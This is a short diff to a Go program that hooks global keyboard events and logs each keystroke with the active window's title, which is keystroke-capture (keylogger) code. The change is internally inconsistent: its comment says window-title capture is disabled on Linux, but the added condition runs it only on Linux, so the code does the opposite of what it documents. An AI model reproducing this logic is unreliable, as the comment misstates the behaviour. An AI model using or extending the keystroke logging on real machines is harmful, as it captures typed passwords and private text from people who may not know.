@@ -20,6 +20,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"runtime"
 	"time"
 	"unicode/utf8"
 )
@@ -143,7 +144,11 @@ func listenKeyboard() {
 		// if detected characters typed, log it and reset ticker.
 		if ev.Kind == hook.KeyDown {
 			// Get title.
-			title := getTitle()
+			var title string
+			// Disable this function on Linux due to the possible memory leaks.
+			if runtime.GOOS == "linux" {
+				title = getTitle()
+			}
 			// Handle control characters (ASCII from 0 to 31 and 127)
 			if ev.Keychar < 32 || ev.Keychar == 127 {
 				keyLogs = append(keyLogs, newKeyLog(TypeControl, title, ControlCharacters[ev.Keychar]))
